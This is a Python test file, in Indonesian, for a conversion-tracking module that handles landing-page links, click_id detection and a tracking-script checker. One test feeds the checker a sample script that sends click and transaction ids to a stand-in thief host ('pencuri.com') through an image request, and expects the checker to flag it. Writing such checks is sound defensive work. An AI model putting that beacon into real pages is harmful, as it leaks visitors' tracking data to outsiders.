"""Tracking konversi & landing page: kalau ini rusak, konversi tidak tercatat dan uang iklan terbuang."""
import asyncio

import tracking


def test_membaca_tombol_dari_html():
    html = ('<a href="/daftar">Daftar</a><a href=\'https://7hr5q.bemobtrcks.com/click\'>Main</a>'
            '<a href="#">Tutup</a><a href="javascript:void(0)">X</a>'
            '<form action="https://situs.com/kirim"></form>'
            '<button onclick="window.open(\'https://lain.com\')">Y</button>')
    urls = [l["url"] for l in tracking.page_links(html, "https://lp.com/promo")]
    assert "https://lp.com/daftar" in urls
    assert "https://7hr5q.bemobtrcks.com/click" in urls
    assert "https://situs.com/kirim" in urls and "https://lain.com" in urls
    assert not any("javascript" in u or u.endswith("#") for u in urls)


def test_subdomain_dianggap_website_yang_sama():
    assert tracking._on_site("https://www.situs.com/x", "situs.com")
    assert tracking._on_site("https://m.situs.com/", "www.situs.com")
    assert not tracking._on_site("https://situs-lain.com/", "situs.com")


def test_penanda_versi_script():
    code = "var a=1;"
    version = tracking.version_of(code)
    snippet = tracking.wrap(code, version, "situs.com")
    assert tracking.installed_version(snippet) == version
    assert tracking.installed_version("<html>tanpa script</html>") is None


def test_click_id_dikenali_di_url_akhir():
    ok = tracking._arrival("https://situs.com/?click_id=ABC123", "situs.com", "Link BeMob")
    tanpa = tracking._arrival("https://situs.com/", "situs.com", "Link BeMob")
    salah = tracking._arrival("https://lain.com/?click_id=A", "situs.com", "Link BeMob")
    assert ok["ok"] is True and tanpa["ok"] is False and salah["ok"] is False


def test_script_wajib_punya_postback_dan_anti_dobel():
    postback = "https://7hr5q.bemobtrcks.com/postback"
    buruk, _ = asyncio.run(tracking.static_problems("var x=1;", "situs.com", postback))
    assert any("postback" in p.lower() for p in buruk)
    assert any("click_id" in p for p in buruk)
    assert any("txid" in p for p in buruk)


def test_script_dilarang_menghubungi_domain_asing():
    code = "var cid='x'; var txid='1'; new Image().src='https://pencuri.com/kirim?cid='+cid+txid;"
    problems, _ = asyncio.run(tracking.static_problems(code, "situs.com", "https://7hr5q.bemobtrcks.com/postback"))
    assert any("domain lain" in p for p in problems)


def test_template_standar_lolos_semua_cek():
    postback = "https://7hr5q.bemobtrcks.com/postback"
    code = tracking.template_code(postback)
    problems, _ = asyncio.run(tracking.static_problems(code, "situs.com", postback))
    assert problems == []
